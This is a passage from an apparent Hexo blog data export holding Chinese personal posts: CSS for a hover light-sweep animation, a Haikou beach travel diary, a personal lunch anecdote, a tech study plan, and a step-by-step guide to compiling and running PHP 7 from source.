rgba(255,255,255,.5) 50%,</span><br><span class=\"line\">  transparent 100%</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>其次光线一般是斜射，使用 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/CSS/transform\" target=\"_blank\" rel=\"noopener\">transform: skewX(145deg)</a> 来偏移角度</p>\n<p>完整光线的代码：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.thumb &#123;</span><br><span class=\"line\">  position: relative;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">.thumb img &#123;</span><br><span class=\"line\">  width: 100%;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">.thumb::before &#123;</span><br><span class=\"line\">  content: &apos;&apos;;</span><br><span class=\"line\">  display: inline-block;</span><br><span class=\"line\">  position: absolute;</span><br><span class=\"line\">  left: -120px;</span><br><span class=\"line\">  top: 0;</span><br><span class=\"line\">  width: 60px;</span><br><span class=\"line\">  height: 100%;</span><br><span class=\"line\">  background: linear-gradient(to right, transparent 0%, rgba(255,255,255,.5) 50%, transparent 100%);</span><br><span class=\"line\">  transform: skewX(145deg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"动画\"><a href=\"#动画\" class=\"headerlink\" title=\"动画\"></a>动画</h2><p>这个光线动画由于是单向不可逆的，不适合用<code>transition</code>方案。</p>\n<p><code>animation</code>方案:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.thumb:hover::before &#123;</span><br><span class=\"line\">  animation-name: light;</span><br><span class=\"line\">  animation-timing-function: linear;</span><br><span class=\"line\">  animation-duration: .5s;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@keyframes light &#123;</span><br><span class=\"line\">  from &#123;</span><br><span class=\"line\">    left: -120px;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  to &#123;</span><br><span class=\"line\">    left: 100%;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"十一游记","id":"173","date":"2015-09-26T18:01:55.000Z","_content":"\n本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。\n\n现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。\n\n今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。\n\n[![IMAG0071 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg)\n\n[![IMAG0069](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg)\n\n[![IMAG0073 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg)\n\n&nbsp;","source":"_posts/e5-8d-81-e4-b8-80-e6-b8-b8-e8-ae-b0.md","raw":"---\ntitle: 十一游记\nid: 173\ncategories:\n  - 骑行\ndate: 2015-09-27 02:01:55\ntags:\n---\n\n本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。\n\n现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。\n\n今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。\n\n[![IMAG0071 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg)\n\n[![IMAG0069](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg)\n\n[![IMAG0073 (1)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg)](https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg)\n\n&nbsp;","slug":"e5-8d-81-e4-b8-80-e6-b8-b8-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhv1000nlzlmqc7002nr","content":"<p>本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。</p>\n<p>现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。</p>\n<p>今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。</p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg\" alt=\"IMAG0071 (1)\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg\" alt=\"IMAG0069\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg\" alt=\"IMAG0073 (1)\"></a></p>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>本来打算十一之前骑车环游海南岛，想象把车子靠在海滩，在没有人的海边游个泳。结果到了海口，发现热的要命。这种高温下骑半个小时就会中暑。</p>\n<p>现在决定转而从重庆出发，用七八天时间到达陕西。正好买的廉价机票允许在海口停留两天，所以今天去海边玩玩。这是第一次真正接触大海，去年十一在青岛只是从海滩边骑车过，人山人海所以没有下去。</p>\n<p>今天去的是海口白沙滩公园，海边人不多，海水也稍微浑浊。只捡到几个很小的贝壳，不过还是很有意思。</p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11.jpg\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0071-11-720x405.jpg\" alt=\"IMAG0071 (1)\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691.jpg\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG00691-720x405.jpg\" alt=\"IMAG0069\"></a></p>\n<p><a href=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11.jpg\"><img src=\"https://xiaoai.me/wp-content/uploads/2015/09/IMAG0073-11-720x405.jpg\" alt=\"IMAG0073 (1)\"></a></p>\n<p>&nbsp;</p>\n"},{"title":"和女同事吃饭","id":"212","date":"2015-11-26T13:26:53.000Z","_content":"\n今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。\n\n为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。\n\n&nbsp;\n\n所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。","source":"_posts/e5-92-8c-e5-a5-b3-e5-90-8c-e4-ba-8b-e5-90-83-e9-a5-ad.md","raw":"---\ntitle: 和女同事吃饭\nid: 212\ncategories:\n  - 经历\ndate: 2015-11-26 21:26:53\ntags:\n---\n\n今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。\n\n为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。\n\n&nbsp;\n\n所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。","slug":"e5-92-8c-e5-a5-b3-e5-90-8c-e4-ba-8b-e5-90-83-e9-a5-ad","published":1,"updated":"2018-03-05T11:32:58.735Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhv2000plzlm65vltxx2","content":"<p>今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。</p>\n<p>为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。</p>\n<p>&nbsp;</p>\n<p>所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天上午去吃顺口溜，碰巧部门一位女程序媛也去吃。</p>\n<p>为什么要这么猥琐的做个记录呢，因为我好几年都没和女生单独坐一起了，更别提交谈了。虽然只是普通同事，但心里感觉非常nice。</p>\n<p>&nbsp;</p>\n<p>所以有时觉得自己过的挺悲催的，可能就要一辈子打光棍了。</p>\n"},{"title":"学习计划","id":"247","date":"2015-12-10T18:43:07.000Z","_content":"\n睡不着，整理一下要学习的技术\n\n### docker\n\n要能做到在多台机器上部署LNMP环境和博客程序\n\n学习文档：\n- https://www.docker.com/\n- www.docker.org.cn/book/\n\n### react\n\n至少实现一个无限下拉列表\n\n*   https://facebook.github.io/react/\n*   http://reactjs.cn/\n\n### polymer\n\n用它写一个wordpress的主题\n\n*   https://www.polymer-project.org/1.0/\n*   http://docs.polymerchina.org/1.0/\n\n### nodejs\n\n写点API或是什么的？比如调用现成的库生成二维码\n\n*   http://expressjs.com/zh/\n\n### Android开发\n\n之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。","source":"_posts/e5-ad-a6-e4-b9-a0-e8-ae-a1-e5-88-92.md","raw":"---\ntitle: 学习计划\nid: 247\ncategories:\n  - linux\ndate: 2015-12-11 02:43:07\ntags:\n---\n\n睡不着，整理一下要学习的技术\n\n### docker\n\n要能做到在多台机器上部署LNMP环境和博客程序\n\n学习文档：\n- https://www.docker.com/\n- www.docker.org.cn/book/\n\n### react\n\n至少实现一个无限下拉列表\n\n*   https://facebook.github.io/react/\n*   http://reactjs.cn/\n\n### polymer\n\n用它写一个wordpress的主题\n\n*   https://www.polymer-project.org/1.0/\n*   http://docs.polymerchina.org/1.0/\n\n### nodejs\n\n写点API或是什么的？比如调用现成的库生成二维码\n\n*   http://expressjs.com/zh/\n\n### Android开发\n\n之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。","slug":"e5-ad-a6-e4-b9-a0-e8-ae-a1-e5-88-92","published":1,"updated":"2018-03-05T11:32:58.736Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhv4000slzlmn74ox8m2","content":"<p>睡不着，整理一下要学习的技术</p>\n<h3 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h3><p>要能做到在多台机器上部署LNMP环境和博客程序</p>\n<p>学习文档：</p>\n<ul>\n<li><a href=\"https://www.docker.com/\" target=\"_blank\" rel=\"noopener\">https://www.docker.com/</a></li>\n<li><a href=\"http://www.docker.org.cn/book/\" target=\"_blank\" rel=\"noopener\">www.docker.org.cn/book/</a></li>\n</ul>\n<h3 id=\"react\"><a href=\"#react\" class=\"headerlink\" title=\"react\"></a>react</h3><p>至少实现一个无限下拉列表</p>\n<ul>\n<li><a href=\"https://facebook.github.io/react/\" target=\"_blank\" rel=\"noopener\">https://facebook.github.io/react/</a></li>\n<li><a href=\"http://reactjs.cn/\" target=\"_blank\" rel=\"noopener\">http://reactjs.cn/</a></li>\n</ul>\n<h3 id=\"polymer\"><a href=\"#polymer\" class=\"headerlink\" title=\"polymer\"></a>polymer</h3><p>用它写一个wordpress的主题</p>\n<ul>\n<li><a href=\"https://www.polymer-project.org/1.0/\" target=\"_blank\" rel=\"noopener\">https://www.polymer-project.org/1.0/</a></li>\n<li><a href=\"http://docs.polymerchina.org/1.0/\" target=\"_blank\" rel=\"noopener\">http://docs.polymerchina.org/1.0/</a></li>\n</ul>\n<h3 id=\"nodejs\"><a href=\"#nodejs\" class=\"headerlink\" title=\"nodejs\"></a>nodejs</h3><p>写点API或是什么的？比如调用现成的库生成二维码</p>\n<ul>\n<li><a href=\"http://expressjs.com/zh/\" target=\"_blank\" rel=\"noopener\">http://expressjs.com/zh/</a></li>\n</ul>\n<h3 id=\"Android开发\"><a href=\"#Android开发\" class=\"headerlink\" title=\"Android开发\"></a>Android开发</h3><p>之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>睡不着，整理一下要学习的技术</p>\n<h3 id=\"docker\"><a href=\"#docker\" class=\"headerlink\" title=\"docker\"></a>docker</h3><p>要能做到在多台机器上部署LNMP环境和博客程序</p>\n<p>学习文档：</p>\n<ul>\n<li><a href=\"https://www.docker.com/\" target=\"_blank\" rel=\"noopener\">https://www.docker.com/</a></li>\n<li><a href=\"http://www.docker.org.cn/book/\" target=\"_blank\" rel=\"noopener\">www.docker.org.cn/book/</a></li>\n</ul>\n<h3 id=\"react\"><a href=\"#react\" class=\"headerlink\" title=\"react\"></a>react</h3><p>至少实现一个无限下拉列表</p>\n<ul>\n<li><a href=\"https://facebook.github.io/react/\" target=\"_blank\" rel=\"noopener\">https://facebook.github.io/react/</a></li>\n<li><a href=\"http://reactjs.cn/\" target=\"_blank\" rel=\"noopener\">http://reactjs.cn/</a></li>\n</ul>\n<h3 id=\"polymer\"><a href=\"#polymer\" class=\"headerlink\" title=\"polymer\"></a>polymer</h3><p>用它写一个wordpress的主题</p>\n<ul>\n<li><a href=\"https://www.polymer-project.org/1.0/\" target=\"_blank\" rel=\"noopener\">https://www.polymer-project.org/1.0/</a></li>\n<li><a href=\"http://docs.polymerchina.org/1.0/\" target=\"_blank\" rel=\"noopener\">http://docs.polymerchina.org/1.0/</a></li>\n</ul>\n<h3 id=\"nodejs\"><a href=\"#nodejs\" class=\"headerlink\" title=\"nodejs\"></a>nodejs</h3><p>写点API或是什么的？比如调用现成的库生成二维码</p>\n<ul>\n<li><a href=\"http://expressjs.com/zh/\" target=\"_blank\" rel=\"noopener\">http://expressjs.com/zh/</a></li>\n</ul>\n<h3 id=\"Android开发\"><a href=\"#Android开发\" class=\"headerlink\" title=\"Android开发\"></a>Android开发</h3><p>之前做过一个简单浏览器，这回做一个闹钟吧，并且能设计到接口的封装。</p>\n"},{"title":"尝鲜PHP 7","id":"45","date":"2015-05-14T22:27:06.000Z","_content":"\nphp7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．\n\n文档可以在 [https://wiki.php.net/phpng](https://wiki.php.net/phpng) 看到\n\n## 安装\n\n普通用户需要从https协议下载，ssh协议只面向PHP小组开发者\n```\ngit clone https://git.php.net/repository/php-src.git\n```\n```\n./buildconf\n./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config\n\n```\n\n#### 在安装时可能遇到的依赖问题\n\n```\nchecking for re2c... no\nconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.\n\n```\n\n##### 需要安装[re2c库](http://re2c.org/)\n\n```\nwget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;ts=1431640121&amp;use_mirror=tcpdiag\n\n```\n接下来configure 和 make 不多写了\n\n###### 其它问题 bison, bzip2, t1lib, pspell, RECODE\n\n```\nconfigure: error: bison is required to build PHP/Zend when building a GIT checkout!\n# yum install bison bison-devel\n\nconfigure: error: Please reinstall the BZip2 distribution\n# yum install bzip2 bzip2-devel\n\nconfigure: error: Your t1lib distribution is not installed correctly. Please reinstall it.\n# yum install t1lib t1lib-devel\n\nconfigure: error: Unable to locate gmp.h\n# yum install gmp-devel\n\nconfigure: error: Cannot find pspell\n# yum install aspell aspell-devel\n\nconfigure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.\n# yum install recode recode-devel\n```\n不同的环境可能还有其它依赖问题，不过都可以google解决的\n\n好了，configure 完成\n```\nGenerating files\nconfigure: creating ./config.status\ncreating main/internal_functions.c\ncreating main/internal_functions_cli.c\n+--------------------------------------------------------------------+\n| License:                                                           |\n| This software is subject to the PHP License, available in this     |\n| distribution in the file LICENSE.  By continuing this installation |\n| process, you are bound by the terms of this license agreement.     |\n| If you do not agree with the terms of this license, you must abort |\n| the installation process at this point.                            |\n+--------------------------------------------------------------------+\nThank you for using PHP.\nconfig.status: creating php7.spec\nconfig.status: creating main/build-defs.h\nconfig.status: creating scripts/phpize\nconfig.status: creating scripts/man1/phpize.1\nconfig.status: creating scripts/php-config\nconfig.status: creating scripts/man1/php-config.1\nconfig.status: creating sapi/cli/php.1\nconfig.status: creating sapi/cgi/php-cgi.1\nconfig.status: creating ext/phar/phar.1\nconfig.status: creating ext/phar/phar.phar.1\nconfig.status: creating main/php_config.h\nconfig.status: executing default commands\nconfigure: WARNING: unrecognized options: --with-mysql\n\n```\n接下来就是漫长的make\n```\n$ make\n# make install\n```\n\n##### 大功告成!\n\n```\n$ /srv/server/php7/bin/php -v\nPHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) \nCopyright (c) 1997-2015 The PHP Group\nZend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies\n```\n\n## 运行\n\n### 路径说明\n\nphp源码包放置在 `/srv/package/php-7`\nphp安装在 `/srv/server/php7`\n\n### 设置配置文件\n\n```\ncp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini\n```\n\n### 作为CGI模式运行在后台\n\n```\nnohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini > /var/log/php-cgi.log &amp;\n```\nwordpress 已经支持运行在php7上了\n\n### 优化点\n\n在编译时可以启用fpm --enable-fpm 这样管理php-cgi进程就方便多了","source":"_posts/e5-b0-9d-e9-b2-9cphp-7.md","raw":"---\ntitle: 尝鲜PHP 7\nid: 45\ncategories:\n  - php\ndate: 2015-05-15 06:27:06\ntags:\n---\n\nphp7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．\n\n文档可以在 [https://wiki.php.net/phpng](https://wiki.php.net/phpng) 看到\n\n## 安装\n\n普通用户需要从https协议下载，ssh协议只面向PHP小组开发者\n```\ngit clone https://git.php.net/repository/php-src.git\n```\n```\n./buildconf\n./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config\n\n```\n\n#### 在安装时可能遇到的依赖问题\n\n```\nchecking for re2c... no\nconfigure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.\n\n```\n\n##### 需要安装[re2c库](http://re2c.org/)\n\n```\nwget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;ts=1431640121&amp;use_mirror=tcpdiag\n\n```\n接下来configure 和 make 不多写了\n\n###### 其它问题 bison, bzip2, t1lib, pspell, RECODE\n\n```\nconfigure: error: bison is required to build PHP/Zend when building a GIT checkout!\n# yum install bison bison-devel\n\nconfigure: error: Please reinstall the BZip2 distribution\n# yum install bzip2 bzip2-devel\n\nconfigure: error: Your t1lib distribution is not installed correctly. Please reinstall it.\n# yum install t1lib t1lib-devel\n\nconfigure: error: Unable to locate gmp.h\n# yum install gmp-devel\n\nconfigure: error: Cannot find pspell\n# yum install aspell aspell-devel\n\nconfigure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.\n# yum install recode recode-devel\n```\n不同的环境可能还有其它依赖问题，不过都可以google解决的\n\n好了，configure 完成\n```\nGenerating files\nconfigure: creating ./config.status\ncreating main/internal_functions.c\ncreating main/internal_functions_cli.c\n+--------------------------------------------------------------------+\n| License:                                                           |\n| This software is subject to the PHP License, available in this     |\n| distribution in the file LICENSE.  By continuing this installation |\n| process, you are bound by the terms of this license agreement.     |\n| If you do not agree with the terms of this license, you must abort |\n| the installation process at this point.                            |\n+--------------------------------------------------------------------+\nThank you for using PHP.\nconfig.status: creating php7.spec\nconfig.status: creating main/build-defs.h\nconfig.status: creating scripts/phpize\nconfig.status: creating scripts/man1/phpize.1\nconfig.status: creating scripts/php-config\nconfig.status: creating scripts/man1/php-config.1\nconfig.status: creating sapi/cli/php.1\nconfig.status: creating sapi/cgi/php-cgi.1\nconfig.status: creating ext/phar/phar.1\nconfig.status: creating ext/phar/phar.phar.1\nconfig.status: creating main/php_config.h\nconfig.status: executing default commands\nconfigure: WARNING: unrecognized options: --with-mysql\n\n```\n接下来就是漫长的make\n```\n$ make\n# make install\n```\n\n##### 大功告成!\n\n```\n$ /srv/server/php7/bin/php -v\nPHP 7.0.0-dev (cli) (built: May 14 2015 18:30:21) \nCopyright (c) 1997-2015 The PHP Group\nZend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies\n```\n\n## 运行\n\n### 路径说明\n\nphp源码包放置在 `/srv/package/php-7`\nphp安装在 `/srv/server/php7`\n\n### 设置配置文件\n\n```\ncp /srv/package/php-7/php.ini-development /srv/server/php7/lib/php.ini\n```\n\n### 作为CGI模式运行在后台\n\n```\nnohup /srv/server/php7/bin/php-cgi -b 127.0.0.1:9002 -c /srv/server/php7/lib/php.ini > /var/log/php-cgi.log &amp;\n```\nwordpress 已经支持运行在php7上了\n\n### 优化点\n\n在编译时可以启用fpm --enable-fpm 这样管理php-cgi进程就方便多了","slug":"e5-b0-9d-e9-b2-9cphp-7","published":1,"updated":"2018-03-05T12:57:36.655Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhv6000tlzlm26qtfh00","content":"<p>php7目前还处于开发阶段，有很多扩展模块不支持．当然有一些新特性还是很值得玩玩的．</p>\n<p>文档可以在 <a href=\"https://wiki.php.net/phpng\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/phpng</a> 看到</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>普通用户需要从https协议下载，ssh协议只面向PHP小组开发者<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://git.php.net/repository/php-src.git</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./buildconf</span><br><span class=\"line\">./configure --prefix=/srv/server/php7 --enable-mbstring --enable-zip --enable-bcmath --enable-pcntl --enable-ftp --enable-exif --enable-calendar --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-curl --with-mcrypt --with-iconv --with-gmp --with-pspell --with-gd --with-jpeg-dir=/usr --with-png-dir=/usr --with-zlib-dir=/usr --with-xpm-dir=/usr --with-freetype-dir=/usr --with-t1lib=/usr --enable-gd-native-ttf --enable-gd-jis-conv --with-openssl --with-mysql=/usr --with-pdo-mysql=/usr --with-gettext=/usr --with-zlib=/usr --with-bz2=/usr --with-recode=/usr --with-mysqli=/usr/bin/mysql_config</span><br></pre></td></tr></table></figure>\n<h4 id=\"在安装时可能遇到的依赖问题\"><a href=\"#在安装时可能遇到的依赖问题\" class=\"headerlink\" title=\"在安装时可能遇到的依赖问题\"></a>在安装时可能遇到的依赖问题</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking for re2c... no</span><br><span class=\"line\">configure: WARNING: You will need re2c 0.13.4 or later if you want to regenerate PHP parsers.</span><br></pre></td></tr></table></figure>\n<h5 id=\"需要安装re2c库\"><a href=\"#需要安装re2c库\" class=\"headerlink\" title=\"需要安装re2c库\"></a>需要安装<a href=\"http://re2c.org/\" target=\"_blank\" rel=\"noopener\">re2c库</a></h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://downloads.sourceforge.net/project/re2c/re2c/0.14.2/re2c-0.14.2.tar.gz?r=&amp;amp;ts=1431640121&amp;amp;use_mirror=tcpdiag</span><br></pre></td></tr></table></figure>\n<p>接下来configure 和 make 不多写了</p>\n<h6 id=\"其它问题-bison-bzip2-t1lib-pspell-RECODE\"><a href=\"#其它问题-bison-bzip2-t1lib-pspell-RECODE\" class=\"headerlink\" title=\"其它问题 bison, bzip2, t1lib, pspell, RECODE\"></a>其它问题 bison, bzip2, t1lib, pspell, RECODE</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: bison is required to build PHP/Zend when building a GIT checkout!</span><br><span class=\"line\"># yum install bison bison-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Please reinstall the BZip2 distribution</span><br><span class=\"line\"># yum install bzip2 bzip2-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Your t1lib distribution is not installed correctly. Please reinstall it.</span><br><span class=\"line\"># yum install t1lib t1lib-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Unable to locate gmp.h</span><br><span class=\"line\"># yum install gmp-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Cannot find pspell</span><br><span class=\"line\"># yum install aspell aspell-devel</span><br><span class=\"line\"></span><br><span class=\"line\">configure: error: Can not find recode.h anywhere under /usr /usr/local /usr /opt.</span><br><span class=\"line\"># yum install recode recode-devel</span><br></pre></td></tr></table></figure>\n<p>不同的环境可能还有其它依赖问题，不过都可以google解决的</p>\n<p>好了，configure 完成<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Generating files</span><br><span class=\"line\">configure: creating ./config.status</span><br><span class=\"line\">creating main/internal_functions.c</span><br><span class=\"line\">creating main/internal_functions_cli.c</span><br><span class=\"line\">+--------------------------------------------------------------------+</span><br><span class=\"line\">| License:                                                           |</span><br><span class=\"line\">| This software is subject to the PHP License, available in this     |</span><br><span class=\"line\">| distribution in the file LICENSE.  By continuing this installation |</span><br><span class=\"line\">| process, you are bound by the terms of this license agreement.     |</span><br><span class=\"line\">| If you do not agree with the terms of this license, you must abort |</span><br><span class=\"line\">| the installation process at this point.                            |</span><br><span 